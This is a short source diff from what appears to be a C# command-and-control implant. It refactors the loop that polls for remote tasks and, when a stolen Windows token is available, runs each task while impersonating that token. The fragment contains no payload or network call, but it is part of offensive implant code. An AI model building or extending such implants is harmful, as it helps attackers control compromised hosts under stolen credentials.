@@ -34,12 +34,12 @@ namespace SaltedCaramel
 
             while (true)
             {
-                SCTask task = implant.CheckTasking();
+                SCTaskObject task = implant.CheckTasking();
                 if (task.command != "none")
                 {
                     if (implant.hasAlternateToken() == true)
                     {
-                        using (WindowsIdentity ident = new WindowsIdentity(Token.stolenHandle))
+                        using (WindowsIdentity ident = new WindowsIdentity(Tasks.Token.stolenHandle))
                         using (WindowsImpersonationContext context = ident.Impersonate())
                             task.DispatchTask(implant);
                     }
